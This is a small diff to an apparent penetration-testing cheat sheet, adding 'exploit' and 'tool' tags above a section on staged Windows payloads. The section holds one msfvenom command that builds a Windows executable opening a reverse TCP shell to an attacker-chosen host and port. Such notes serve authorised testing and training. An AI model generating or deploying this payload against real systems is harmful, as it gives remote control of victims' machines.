@@ -1,3 +1,6 @@
+---
+tags: [ exploit, tool ]
+---
 # Non-Meterpreter Binaries
 # Staged Payloads for Windows
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
